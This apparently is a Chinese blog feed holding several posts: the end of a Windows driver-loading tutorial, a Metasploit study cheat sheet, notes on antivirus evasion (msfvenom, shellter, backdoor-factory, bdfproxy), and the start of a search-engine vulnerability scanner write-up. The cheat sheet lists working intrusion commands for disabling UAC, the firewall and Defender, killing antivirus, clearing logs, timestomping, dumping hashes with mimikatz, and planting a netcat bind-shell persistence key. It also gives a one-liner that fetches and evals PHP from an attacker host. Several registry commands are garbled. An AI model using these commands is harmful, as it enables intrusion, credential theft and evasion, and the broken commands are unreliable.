class="string">"CreateService失败,错误号:%d\n"</span>,dwRtn);</span><br><span class="line">			<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"服务之前已经创建过了,正在打开之前的服务！\n"</span>);</span><br><span class="line">			hServiceDDK = OpenService(hServiceMgr,lpszDreverName,SERVICE_ALL_ACCESS);</span><br><span class="line">			<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"打开服务出错 错误码：%d"</span>,GetLastError());</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"打开服务成功"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"CreateService OK\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = StartService(hServiceDDK,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwRtn = GetLastError();</span><br><span class="line">		<span class="keyword">if</span> (dwRtn != ERROR_IO_PENDING &amp;&amp; dwRtn != ERROR_SERVICE_ALREADY_RUNNING)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"StartService faild %d"</span>,dwRtn);</span><br><span class="line">			bRet = FALSE;</span><br><span class="line">			<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dwRtn == ERROR_IO_PENDING)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//设备被挂起</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"设备已经被挂起"</span>);</span><br><span class="line">				bRet = FALSE;</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//服务已经启动了</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"服务之前已经启动了！ ERROR_SERVICE_ALREADY_RUNNING"</span>);</span><br><span class="line">				bRet = TRUE;</span><br><span class="line">				<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = TRUE;</span><br><span class="line">BeforeLeave:</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	<span class="keyword">if</span>(hServiceDDK)</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实代码阅读起来很简单，首先就是我们获取文件的完整路径，然后我们打开SC的句柄（判断性质的就不记录了），接着我们创建服务，创建服务的时候我们需要用到我们之前得到的SC句柄，创建失败的话呢我们判断是否是之前的服务，如果是就打开。我们接下来启动服务，然后就是简单的判断，需要注意的是，这里用到了很老的goto语句。</p>
<h2 id="卸载函数"><a href="#卸载函数" class="headerlink" title="卸载函数"></a>卸载函数</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/* 用来卸载驱动                                                                     */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnLoadNTDriver</span><span class="params">(<span class="keyword">char</span> * szSvrName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	SC_HANDLE hServiceMgr = <span class="literal">NULL</span>;<span class="comment">//scm管理器的句柄</span></span><br><span class="line">	SC_HANDLE hServiceDDK = <span class="literal">NULL</span>;<span class="comment">//NT驱动的服务句柄</span></span><br><span class="line">	SERVICE_STATUS SvrSta; </span><br><span class="line">	hServiceMgr  = OpenSCManager(<span class="literal">NULL</span>,<span class="literal">NULL</span>,SC_MANAGER_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span>(hServiceMgr == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//打开SCM管理器</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManager失败：%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenSCManager成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//打开驱动所对应的服务</span></span><br><span class="line">	hServiceDDK = OpenService(hServiceMgr,szSvrName,SERVICE_ALL_ACCESS);</span><br><span class="line">	<span class="keyword">if</span> (hServiceDDK == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//打开驱动所对应的服务失败</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenService打开服务失败Faild:%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OpenService打开成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!ControlService(hServiceDDK,SERVICE_CONTROL_STOP,&amp;SvrSta))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ControlService faild :%d\n"</span>,GetLastError());</span><br><span class="line">		bRet = FALSE;</span><br><span class="line">		<span class="keyword">goto</span> BeforeLeave;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"ControlService成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//动态卸载驱动</span></span><br><span class="line">	<span class="keyword">if</span> (!DeleteService(hServiceDDK))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeleteService faild:%d\n"</span>,GetLastError());</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"DeleteService 删除成功\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	bRet = TRUE;</span><br><span class="line">BeforeLeave:</span><br><span class="line">	<span class="keyword">if</span> (hServiceMgr)</span><br><span class="line">		CloseServiceHandle(hServiceMgr);</span><br><span class="line">	<span class="keyword">if</span>(hServiceDDK)</span><br><span class="line">		CloseServiceHandle(hServiceDDK);</span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>卸载函数在打开服务之前是一样的，区别就是不打开服务了，直接进行控制服务，使用<code>SERVICE_CONTROL_STOP</code>停止服务，然后通过delete删除服务就完成了。</p>
<p>主控制函数的话呢就是获取控制台参数就可以了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &lt;<span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"需要两个参数，第一个是临时服务的名称，第二个是你的驱动路径！"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = LoadNTDriver(argv[<span class="number">1</span>],argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">if</span>(!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"驱动加载失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"按任何键卸载驱动"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	bRet = UnLoadNTDriver(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"驱动卸载失败"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行的效果：<br><img src="img1.jpg" alt="sysmanger"></p>
<h2 id="其他程序"><a href="#其他程序" class="headerlink" title="其他程序"></a>其他程序</h2><p>其实类似的程序有个叫做<code>KmdManager.exe</code>这个的程序其实就是比较好用的。</p>
]]></content>
      <categories>
        <category>驱动开发</category>
      </categories>
      <tags>
        <tag>驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Msf</title>
    <url>/2020/06/03/Msf/</url>
    <content><![CDATA[<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ol>
<li>Single:只有一段代码的payload</li>
<li>Stages: 只用来网络连接，比较小</li>
<li>Stager:  下载目的payload，比较小</li>
</ol>
<h2 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h2><p>用来扫描，信息收集，枚举指纹探测。</p>
<h2 id="encoders"><a href="#encoders" class="headerlink" title="encoders"></a>encoders</h2><p>主要对payload加密，防查杀</p>
<h2 id="Nops"><a href="#Nops" class="headerlink" title="Nops"></a>Nops</h2><p>提高payload的稳定性和大小。</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>用来漏洞利用。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><ol>
<li>msfupdate更新msf</li>
<li>help 查看帮助，后面可以加上指定的命令</li>
<li>exit 退出</li>
<li>msfconsole的-r参数可以指定一个资源脚本文件</li>
<li>banner 查看banner信息</li>
<li>connect 类似于msf的nc</li>
<li>show XXX 查看模块的可用状态，在具体模块里面也是可以使用show命令</li>
<li>search xxx 搜索模块<ol>
<li>name：搜索名称包含的</li>
<li>platform:搜索平台</li>
<li>cve:搜索cve</li>
</ol>
</li>
<li>use 进入某个模块<ol>
<li>在use下面的：</li>
<li>info查看信息</li>
<li>show options 查看参数</li>
<li>show target 展示目标</li>
<li>show payloads 展示适用于当前漏洞的payload</li>
<li>check 只是检测一下（大部分没有）</li>
<li>back 返回上一层</li>
<li>set 设置值<ol>
<li>target 设置目标系统</li>
<li>payloads 设置payload</li>
</ol>
</li>
</ol>
</li>
<li>db_<ol>
<li>db_status,查看连接状态</li>
<li>db_nmap 使用namp扫描，将信息保存下来</li>
<li>hosts 查看nmap扫描的结果 -s 查找 -c 查看列</li>
</ol>
</li>
<li>creds 查看报出来的密码</li>
<li>vlun 查看密码</li>
<li>setg 全局设置（只能在当前会话中有用，除非你要save了）</li>
<li>run/exploit 执行当前模块<ol>
<li>-j 参数后台方式执行</li>
<li>分为Activity和Passive</li>
</ol>
</li>
<li>jobs 查看当前的任务</li>
<li>sessions 查看当前的shell连接<ol>
<li>-i 进入session 后面指定session 编号</li>
</ol>
</li>
<li>load<ol>
<li>加载插件，例如load openvas</li>
<li>unload nessus 取消加载插件</li>
</ol>
</li>
<li>loadpath 加载自己写的插件</li>
<li>route 通过指定session路由（通过得到的session入侵内网）</li>
<li>irb：开发的接口</li>
<li>resource 加载资源文件</li>
<li>payload也是可以单独使用，然后使用generate生成一个payload，<ol>
<li>-b 指定坏字符，msf会智能选择encode</li>
<li>-e 指定encode</li>
<li>-i 编码次数</li>
<li>-k 新的进程</li>
<li>-x 新的模板</li>
<li>-t 输出类型</li>
<li>-f 输出文件</li>
<li>-s 加指定个数的nop</li>
</ol>
</li>
<li>Meterpreter是比较高级的shell<ol>
<li>help 查看命令</li>
<li>background 返回上一级</li>
<li>pwd 查看目录</li>
<li>dir和ls都是查看目录</li>
<li>cat 查看文件</li>
<li>mkdir 创建目录</li>
<li>rmdir 删除目录</li>
<li>mv,rm 移动，删除</li>
<li>edit 编辑（类似于vi）</li>
<li>lpwd 当前我们msf的目录</li>
<li>lcd 移动msf执行的目录</li>
<li>run 执行命令</li>
<li>bgrun 后台命令<ol>
<li>tab查看支持的一些命令</li>
<li>通过bgrun XXX执行就可以了</li>
</ol>
</li>
<li>clearev清除日志</li>
<li>download 下载到lpwd的目录下</li>
<li>upload 上传（Windows下的目录需要注意需要两个\，防止转义）</li>
<li>execute -f 命令 -i -h（执行命令） -i 交互 -h 隐藏</li>
<li>ps查看进程</li>
<li>getuid 查看当前的账号</li>
<li>gesystem 强制转换为system</li>
<li>getprivs 查看权限</li>
<li>getproxy 获取代理</li>
<li>getpid 查看注入的进程</li>
<li>migrate 迁移进程 migrate pid</li>
<li>hashdump dump下来hash值</li>
<li>sysinfo 查看系统信息</li>
<li>kill 杀死进程</li>
<li>shell 获取操作系统的shell</li>
<li>show_mount 查看分区</li>
<li><code>search -f win.ini</code> 查找文件</li>
<li>netstat 查看开放的端口和连接</li>
<li>arp 查看缓存</li>
<li>route 查看路由表</li>
<li>ldletime 查看空闲时间</li>
<li>resource 调用资源文件（就是一些指令）</li>
<li>record_mic 记录麦克风</li>
<li>webcam_list 列举摄像头</li>
<li>web_snap -i 1 -v false 查看摄像头</li>
<li>python_execute “” 执行原生的python代码（无需环境）</li>
<li>我们需要先load python 进来</li>
<li><code>python_import -f xxx.py</code> 导入py代码</li>
<li>msfconsole -x “” 一条命令执行</li>
</ol>
</li>
<li>MSF的扫描<ol>
<li>使用内置的nmap：<code>db_nmap 192.168.209.1</code></li>
<li>auxilary模块的使用方法和exploit模块的使用方法类似</li>
<li>有的时候我们需要提供session（通过background返回去）</li>
<li>如果提示Known bug in WMI query, try migrating to another process 迁移到另一个进程再次尝试</li>
<li>小知识：mssql端口号可能不是1433，他可能是个随机的数，我们可以通过1434这个端口查询出真是的端口号。</li>
</ol>
</li>
<li>WMAP插件（自动扫描msf中的http模块）<ol>
<li>load wmap</li>
<li><code>wmap_sites -a http://192.168.209.1</code></li>
<li>-l 查看任务列表</li>
<li><code>wmap_targets -t http://192.168.209.1/test</code></li>
<li><code>wmap_run -e</code>执行</li>
</ol>
</li>
<li>和扫描器配合<ol>
<li>openvas/nessus/nessus<ol>
<li>使用load openvas<ol>
<li>使用方法比较简单，-h看看就知道了，这里不记录了</li>
</ol>
</li>
<li>使用openvas/nessus导出的nbe文件（db_import）</li>
</ol>
</li>
</ol>
</li>
<li>客户端漏洞<ol>
<li>使用存在漏洞的客户端进行入侵<ol>
<li>例如使用低版本的IE访问某些页面就会被入侵</li>
<li>使用存在漏洞的pdf阅读器会被入侵，msf支持生成含有payload的pdf</li>
<li>通过flash进行入侵</li>
<li>brewser_autopwn2这个模块集成了好用的浏览器漏洞模块，一运行相当于测试了好多的模块</li>
<li>jre也是可能存在漏洞</li>
<li>安卓中也是payload在msf有的。</li>
<li>office中的宏插入vbs感染计算机。</li>
</ol>
</li>
</ol>
</li>
<li>拥有shell之后进行后渗透测试阶段的操作<ol>
<li>Meterpreter的shell</li>
<li>load priv 加载提权插件</li>
<li>getsystem提权提权，如果不行的话呢很可能是UAC的访问控制</li>
<li>local目录下的模块是提权用的</li>
<li>ask模块是用来得到UAC允许的<ol>
<li>set payload xxx(与之前一样的payload)</li>
<li>set filename xxx 设置一个文件名称</li>
<li>然后set session id 设置拿来的session</li>
<li>exploit之后会得到一个经过UAC访问控制的session，之后我们就可以getsystem</li>
</ol>
</li>
<li>bypassuac模块<ol>
<li>set session id 设置一个Session</li>
<li>set payload xxx和上面一个一样，有一些别的没记录，看一下就知道了。</li>
<li>这个模块就不会用来用户确定UAC权限的了。</li>
<li>也是可以获得UAC允许的session</li>
</ol>
</li>
<li>bypassuac_injection模块<ol>
<li>这个是通过DLL注入进去的，操作的话呢还是差不多的。</li>
</ol>
</li>
<li>通过漏洞进行账号的提权<ol>
<li>13_053/13_081/13_097/ppr_flatten_tcp（一些杂项没有写）<ol>
<li>set payload</li>
<li>set session id </li>
<li>exploit</li>
<li>这个时候会利用漏洞提升权限</li>
</ol>
</li>
</ol>
</li>
<li>vncinject这个payload是图形化的VNCshell<ol>
<li>ViewOnly这个参数改为no的话呢，你就可以进行操作了</li>
<li>这个payload不是所有多可以使用的</li>
</ol>
</li>
<li>关闭UAC<ol>
<li><pre><code>cmd.exe /k %windir%\System32\reg.exe ADD
HKLMSOF TWAREMicrosoft\Windows\CurrentVersion\Policies\System N
EnableLUA /t REG DWORD /d0 /f
cmd.exe /k %windir%\System32\reg.exe ADD
HKLM\SOFTWAREMicrosoft\Windows\CurrentVersion\Policies\system /N
LocalAccountTokenFilterPolicy /t REG DWORD/d1 f
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	2. 然后重启计算机</span><br><span class="line">11. 关闭防火墙：需要管理员或system权限 &#96;netsh advfirewall set allprofiles state off&#96;</span><br><span class="line">12. 关闭Windefend：&#96;net stop windefend&#96;</span><br><span class="line">13. Bitlocker 操盘加密：&#96;manage-bde -off C&#96;关闭C盘加密&#96;manage-bde -status C&#96;查看C盘加密状态</span><br><span class="line">14. 关闭DEP：&#96;bcdedit.exe &#x2F;set &#123;current&#125; nxAlwaysOff&#96;</span><br><span class="line">15. 在Meterpreter中使用run killav关闭常见的杀毒软件或者&#96;run post&#x2F;windows&#x2F;manage&#x2F;killav&#96;</span><br><span class="line">16.</span><br></pre></td></tr></table></figure>
开启远程桌面服务
run post/windows/manage/enable. rdp
第二种方法
run getgui -e
run getgui -u yuanfh -p pass
run multi console. command -rC clean up 201 60824.1855.rc
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17. 让看远程桌面：&#96;screenshot&#96;</span><br><span class="line">18. &#96;use espia&#96; 然后 &#96;screengraby&#96;</span><br><span class="line">19. Token：</span><br><span class="line">	1. 分类：</span><br><span class="line">		1. 交互的Token（3389之类的）</span><br><span class="line">		2. 非交互的Token（smb文件共享之类的）</span><br><span class="line">	2. 注销的交互token会变成非交互的token，权限并没有改变</span><br><span class="line">	3. 通过域管理员遗留的token，我们利用，然后进行管理</span><br><span class="line">	4. load incognito    加载这个插件</span><br><span class="line">	5. list token 列举token（需要域管理员访问过我们）</span><br><span class="line">	6. impersonate_token LAB\\administrator   (\\是取消转义\，后面的是我们通过列举token得到的名称)</span><br><span class="line">	7. 然后我们就获取到了域管理权限</span><br><span class="line">	8. &#96;execute -f cmd.exe -i -t&#96; -t 使用我们的token，-i是交互，-f是命令</span><br><span class="line">	9. 然后我们就有域管理员的的权限</span><br><span class="line">	10. 使用本机的漏洞进行提权：ms_10_015，通过已有的session通过遗留的token进行提权</span><br><span class="line">20. 添加注册表(添加nc自动启动)：</span><br></pre></td></tr></table></figure>
upload /usr/share/windows binaries/nc.exe C:l\windows\\system32 
reg enumkey -k HKLM\softwarel\microsoft\windowsl\currentversion\run
reg setval -k HKLM\softwarel\microsoft\windows\\currentversion\\run -V nc -d &apos;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&apos;
reg queryval -k HKLM\softwarel\microsoft\windows\\currentversion\\Run -V nc</code></pre></li>
</ol>
</li>
<li>开启防火墙策略：<code>netsh firewall add portopening TCP 444 &quot;test&quot; ENABLE ALL</code></li>
<li>抓包：使用meterpreter的命令<ol>
<li>使用命令：<code>sniffer_start 1</code>选择抓包的网卡编号，可以通过：<code>sniffer_interfaces</code>进行获取</li>
<li>使用：<code>sniffer_dump 1 1.cap</code>进行dump我们的数据包</li>
<li>需要注意的是我们抓包的缓冲区是有限的，所以我们要及时dump</li>
<li>这个智能的是不会抓取Meterpreter自己发送的数据包</li>
<li>psnuffle这个是对之前的cap文件进行分析，但是还是wireshark会比较好一些</li>
</ol>
</li>
<li>文件搜索<ol>
<li><code>search d- c:\\ -f *.ini</code></li>
</ol>
</li>
<li>密码破解<ol>
<li>首先我嗯需要通过Meterpreter获取到hash</li>
<li>然后我们使用：<code>use post/windows/gather/hashdump</code></li>
<li>然后设置我们的session</li>
<li>然后exploit就可以了，几句可以获得hash了</li>
<li>然后我们使用：<code>auxilary/analyze/jtr_crack_fast</code></li>
<li>直接run就好了</li>
<li>这个只是判断一些简单的密码时候否和我hash相匹配</li>
</ol>
</li>
<li>文件的MAC时间（Modified【修改文件内容】 / Accessed【访问时间】 / Changed【权限时间修改】）<ol>
<li><code>touch -d &quot;5 days ago&quot; 1.txt</code>将访问的时间修改文件的时间提前五天，-t 是直接修改时间戳</li>
<li><code>stat 1.txt</code>查看MAC时间状态</li>
<li>Meterpreter实现修改时间<ol>
<li><code>timestomp -v 1.txt</code> （MACE的E 是文件扇区数据修改时间）</li>
<li>-z（-m -a -c -e） 指定时间</li>
<li>-b 设置时间改为空</li>
<li>-r 是递归</li>
</ol>
</li>
</ol>
</li>
<li>Pivoting 跳板<ol>
<li><code>run autoroute -s 1.1.1.10/24</code>进行路由转发</li>
<li>使用protfwd：<ol>
<li><code>portwfwd -add -L 1.1.1.0-l 3389 -r 2.1.1.11 -p 3389</code>将自己的3389和<code>2.1.1.11</code>中间做了隧道</li>
</ol>
</li>
</ol>
</li>
<li>handler模块中的<code>exitonsession</code>设置为false的话呢是接收到session的话呢是不会退出的。<ol>
<li><code>set AutoRunScript migrate -n explore.exe</code>这段命令是session一来自动转移</li>
</ol>
</li>
<li>POST模块<ol>
<li>扩大战果的模块</li>
<li><code>run post/windwos/gather/credentials/credential_colltor</code></li>
<li>post的模块大部分都是这样子的扫描查看信息的，在我们的session中</li>
<li><code>run post/multi/recon/local exploit_ suggester</code><ol>
<li>自动帮我们侦查本地提权的漏洞（多个）</li>
</ol>
</li>
<li><code>set AutoRunScript post/windows/gather/dumplist</code> 自动执行查看用户最近使用文档（这个需要我们先转移用户）</li>
<li>InitalAuotoRunScript 在AutoRunScript执行之前运行</li>
<li>Meterpreter中：<code>set hostsedit -e 1.1.1.1,www.baidu.com</code>修改host，会自动清除缓存（缓存相对host优先级高）<ol>
<li><code>run winenum</code>查看Windows的信息（可能需要高权限）</li>
</ol>
</li>
</ol>
</li>
<li>持久shell<ol>
<li><code>run metsvc -A</code>(这个会写文件，安装一个服务)</li>
<li><code>use exploit/multi/handler</code></li>
<li><code>set payload windwos/metsvc_bind_tcp</code></li>
<li><code>set rhost 192.168.209.129</code></li>
<li><code>set lport 3333</code></li>
<li>这种相对不好用，下面的好用</li>
<li><code>run persistence -X -r 192.168.209.129 -p 4444 -i 10</code> 下次重启自动启动，延迟10s启动</li>
</ol>
</li>
<li><code>Mimikatz</code><ol>
<li><code>load mimikatz</code></li>
<li><code>msv</code> 查看用户信息</li>
<li><code>kerberos</code> 读取内存中的登录密码</li>
<li><code>mimikatz_command -f modulename</code></li>
</ol>
</li>
<li>还可以使用PHP脚本生成的shell反弹连接msf<ol>
<li>在handler中使用和之前一样的使用payload：php/meterpreter/reverse_tcp</li>
</ol>
</li>
<li>Web Delivery<ol>
<li>代码执行漏洞的利用</li>
<li><code>use exploit/multi/script/web_deliery</code></li>
<li>set tagert PHP（php,python…）</li>
<li>payload:php/meterpreter/reverse_tcp</li>
<li>然后我们会生成一个php命令，目标有代码执行，我们就让他执行</li>
<li>命令类似于：<code>php -d allow url fopen=true -r &quot;eval(file get_ contents( &#39;http://192.168.21.90: 8080/&#39;));&quot;</code></li>
<li>然后就会反弹连接我们的msf</li>
</ol>
</li>
<li>可以使用hidden的绑定<ol>
<li>就是只有我们连接了才会开放端口，我们不连接的话呢是不会开启的</li>
</ol>
</li>
<li>armitage中的find attack之寻找可用的端口对应的模块，hail是全部检测下。</li>
<li>社会工程学<ol>
<li>setooklit</li>
<li>使用社会工程学攻击</li>
<li>Wbesit attack vectors</li>
<li>选择身份验证的攻击</li>
<li>这个会克隆一个URL，然后接受表单</li>
<li>写到本机上面，最后跳转到真正的页面</li>
<li>还可以通过邮箱进行攻击</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀</title>
    <url>/2020/05/31/%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h1 id="msfvenom加密生成"><a href="#msfvenom加密生成" class="headerlink" title="msfvenom加密生成"></a>msfvenom加密生成</h1><p><code>strings *.exe</code>查看exe中的字符串<br><code>md5sum *.exe</code>查看md5值<br>生成加密的exe:<br><img src="img1.jpg" alt="new_exe"></p>
<p>-x 参数指定模板<br>-e 指定加密模块<br>-i 指定加密的次数</p>
<h1 id="内存执行"><a href="#内存执行" class="headerlink" title="内存执行"></a>内存执行</h1><p>通过在内存中直接执行，并不需要向硬盘上写入文件。<br>典型的案例是smb的写入payload，当然需要有目标系统的账号密码。</p>
<h1 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h1><p>Veil实际上还是将后门放在内存</p>
<h1 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h1><p>实现代码混淆，使正常的exe的作为模板，将木马帮顶进去，但是shellter会导致源文件失效，并且只支持Win32，<br>选择A方式是选择项比较少。<br>然后接下来的操作比较少。</p>
<h1 id="backdoor-factory"><a href="#backdoor-factory" class="headerlink" title="backdoor-factory"></a>backdoor-factory</h1><ol>
<li>CTP方式是增加新的代码段。</li>
<li>代码缝隙添加shellcode（代码洞越小越好，其实就是连续的0x00）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#96;which cat&#96; .</span><br><span class="line">拷贝cat 命令到当前目录</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>支持分阶段的代码片段跳转。</p>
<p>-f 指定被附加的文件（都要指定）<br>-S 加测是否支持注入<br><code>-s show</code> 展示当前可以的payload,-s 指定shellcode<br>-H 反弹的目标<br>-P 指定端口<br>-J 使用多代码洞跳转<br>-a 在后面加代码段，然后附加shellcode</p>
<p>与veil可以结合。</p>
<h1 id="Bdfproxy"><a href="#Bdfproxy" class="headerlink" title="Bdfproxy"></a>Bdfproxy</h1><p>劫持流量，将传输的EXE中注入shellcode。</p>
<p><code>apt-get install kali-linux-all</code>安装所有的kali包。</p>
<p><img src="img2.jpg" alt="bdfproxy"><br>修改IP往下拉，会有几个系统版本的。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Wker_SearchEngineScanVlun FrameWork</title>
    <url>/2020/05/24/%C2%96Wker-SearchEngineScanVlun-FrameWork/</url>
    <content><![CDATA[<h1 id="工具信息"><a href="#工具信息" class="headerlink" title="工具信息"></a>工具信息</h1><p>工具名：<code>Wker_SearchEngineScanVlun FrameWork</code><br>运行平台：<code>Windows</code><br>开发时长：2天<br>当前版本：1.0<br>完成日期：2020年5月24日<br>插件数目：5个搜索引擎插件，3个漏洞检测插件<br>用途：用来统计搜索引擎对于某种漏洞的页面的持有数目。</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这个小软件其实想了好多，一开始并不想去写，但是为了能够更好的提升Web安全的质量，所以编写了这款小工具。<br>工具的作用是对某个搜索引擎（例如百度谷歌）所爬取的链接进行漏洞的检测，以此提升整个web的安全质量。<br>在写这个程序之前我一开始装备使用B/S架构编写，也就是想beef，nessus这样的程序实现浏览器的UI交互方式，因为之前开发的B/S架构都是用的别的语言进行开发，C++开发这种的也写过，但是没写的很好，本想尝试一下，但是学校开学了（大二学生是真苦逼），所以只能重新改为C/S架构了。</p>
<h1 id="工具框架"><a href="#工具框架" class="headerlink" title="工具框架"></a>工具框架</h1><p>既然称之为<code>FrameWork</code>，所以我起初编写的是一个框架，然后才写的插件，所以说自己也是可以编写属于自己插件的。<br>工具分为了两个框架，一个是搜索引擎的框架，另外一个是漏洞检测框架。</p>
<ol>
<li>搜索引擎框架是用来从搜索引擎中提取链接</li>
<li>漏洞检测框架式用来检测链接是否存在漏洞</li>
</ol>
<p>我沿用了nessus的思想，实现从插件中提取，生成策略的方法。</p>
<p>首先我们先下载程序，下载链接我会在文章底部进行提供的，下载完毕之后，是个zip，直接解压运行就好了。<br>里面的<code>Wker_SearchEngineScanVlun FrameWork.exe</code>就是框架程序了，运行之后，我们可以进行。<br>运行程序之后我们会看到AboutDialog，里面有一些说明信息。<br><img src="img1.jpg" alt="AboutDialog"><br>这里就是说明，如果通过本软件做任何违法的事情，所有的后果与作者无关。<br>还说了，如果想要获取更多的插件，我们需要到我的博客上进行下载。<br>如果同意上述的许可，就点击确定。</p>
<p>在这之前我先要介绍一些工具的目录。<br><img src="img2.jpg" alt="Floder"></p>
<ol>
<li><code>Search_Engine</code>这个文件夹下面是存放搜索引擎插件的</li>
<li><code>Vlun</code>这个文件夹是存在漏洞检测插件的</li>
